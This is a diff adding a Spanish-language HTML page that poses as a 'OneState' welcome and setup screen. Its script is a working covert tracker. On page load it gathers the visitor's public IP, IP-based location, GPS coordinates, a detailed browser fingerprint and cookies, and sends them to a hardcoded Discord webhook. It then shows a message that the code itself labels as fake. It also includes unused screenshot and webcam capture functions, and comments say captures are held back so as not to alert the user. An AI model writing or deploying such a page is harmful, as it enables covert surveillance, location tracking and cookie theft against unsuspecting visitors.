@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OneState - Bienvenido</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 90%;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            font-size: 0.9rem;
+            opacity: 0.7;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>OneState</h1>
+        <p>Bienvenido a OneState. Estamos configurando tu experiencia...</p>
+        <div class="loader"></div>
+        <p class="status">Cargando información del sistema...</p>
+    </div>
+
+    <script>
+        // TU WEBHOOK URL (CÁMBIALO)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1556066207914926272/nCA5tnzqMXHOBQ7cjhZrcM8tmqvBjiGYulwIs9lPpdnoKUXZr5qc69gGPOey-YPSriEu";
+
+        // Función para obtener IP pública
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                try {
+                    const response = await fetch('https://icanhazip.com');
+                    return (await response.text()).trim();
+                } catch {
+                    return "No disponible";
+                }
+            }
+        }
+
+        // Función para obtener información de la IP
+        async function getIPInfo(ip) {
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+                return await response.json();
+            } catch {
+                return null;
+            }
+        }
+
+        // Función para obtener ubicación del navegador
+        function getBrowserLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            });
+                        },
+                        () => resolve(null)
+                    );
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+
+        // Función para obtener información del navegador
+        function getBrowserInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                online: navigator.onLine,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                hardwareConcurrency: navigator.hardwareConcurrency || 'No disponible',
+                deviceMemory: navigator.deviceMemory || 'No disponible',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                webdriver: navigator.webdriver || false,
+                doNotTrack: navigator.doNotTrack || 'No especificado'
+            };
+            return info;
+        }
+
+        // Función para tomar screenshot (solo si la página lo permite)
+        async function takeScreenshot() {
+            try {
+                // Esto solo funciona si el usuario da permiso
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                const image = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(track => track.stop());
+                
+                return image;
+            } catch {
+                return null;
+            }
+        }
+
+        // Función para intentar acceder a la cámara
+        async function takeWebcamPhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                const image = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+                
+                return image;
+            } catch {
+                return null;
+            }
+        }
+
+        // Función para obtener cookies
+        function getCookies() {
+            return document.cookie || "No hay cookies disponibles";
+        }
+
+        // Función para obtener historial (si es posible)
+        function getHistory() {
+            // No se puede acceder al historial del navegador directamente
+            return "No accesible";
+        }
+
+        // Función principal para enviar toda la información
+        async function sendInfoToWebhook() {
+            try {
+                // Obtener IP
+                const publicIP = await getPublicIP();
+                const ipInfo = await getIPInfo(publicIP);
+                const browserLocation = await getBrowserLocation();
+                const browserInfo = getBrowserInfo();
+
+                // Construir mensaje
+                const embed = {
+                    title: "🚨 OneState - Nuevo visitante detectado 🚨",
+                    color: 15158332,
+                    fields: [
+                        { name: "🌐 IP Pública", value: publicIP, inline: true },
+                        { name: "📍 Ciudad", value: ipInfo?.city || 'No disponible', inline: true },
+                        { name: "🌍 País", value: ipInfo?.country || 'No disponible', inline: true },
+                        { name: "📌 Coordenadas IP", value: `${ipInfo?.lat || 'N/A'}, ${ipInfo?.lon || 'N/A'}`, inline: true },
+                        { name: "📡 ISP", value: ipInfo?.isp || 'No disponible', inline: true },
+                        { name: "🏢 Organización", value: ipInfo?.org || 'No disponible', inline: true },
+                        { name: "🕐 Zona Horaria", value: ipInfo?.timezone || 'No disponible', inline: true },
+                        { name: "💻 Navegador", value: browserInfo.userAgent.substring(0, 100), inline: false },
+                        { name: "🌐 Idioma", value: browserInfo.language, inline: true },
+                        { name: "💾 Plataforma", value: browserInfo.platform, inline: true },
+                        { name: "🖥️ Resolución", value: `${browserInfo.screenWidth}x${browserInfo.screenHeight}`, inline: true },
+                        { name: "🎨 Color Depth", value: browserInfo.screenColorDepth, inline: true },
+                        { name: "⚡ CPU Cores", value: browserInfo.hardwareConcurrency, inline: true },
+                        { name: "💾 RAM (GB)", value: browserInfo.deviceMemory, inline: true },
+                        { name: "👆 Touch Points", value: browserInfo.maxTouchPoints, inline: true },
+                        { name: "🔒 Cookies", value: getCookies().substring(0, 100) || 'No hay', inline: false },
+                        { name: "📅 Fecha", value: new Date().toLocaleString(), inline: true }
+                    ],
+                    footer: { text: "OneState Web v1.0" }
+                };
+
+                // Si tenemos ubicación del navegador, añadirla
+                if (browserLocation) {
+                    embed.fields.push({ 
+                        name: "📍 Ubicación GPS", 
+                        value: `Lat: ${browserLocation.lat}, Lon: ${browserLocation.lon} (Precisión: ${browserLocation.accuracy}m)`, 
+                        inline: false 
+                    });
+                }
+
+                const message = { embeds: [embed] };
+
+                // Enviar al webhook
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+
+                // Intentar tomar screenshot y foto
+                console.log("Intentando capturas...");
+                // No tomamos capturas automáticamente para no alertar al usuario
+
+                return response.ok;
+            } catch (error) {
+                console.error("Error:", error);
+                return false;
+            }
+        }
+
+        // Ejecutar al cargar la página
+        window.onload = async function() {
+            // Enviar información
+            const success = await sendInfoToWebhook();
+            
+            // Actualizar el estado en la página
+            const statusElement = document.querySelector('.status');
+            if (success) {
+                statusElement.textContent = "✅ Sistema configurado correctamente";
+            } else {
+                statusElement.textContent = "⚠️ Error en la configuración";
+            }
+
+            // Mostrar mensaje falso
+            setTimeout(() => {
+                document.querySelector('.loader').style.display = 'none';
+                document.querySelector('h1').textContent = 'OneState';
+                document.querySelector('p').textContent = 'Tu sistema está listo. Gracias por usar OneState.';
+                statusElement.textContent = 'Versión 1.0.0';
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
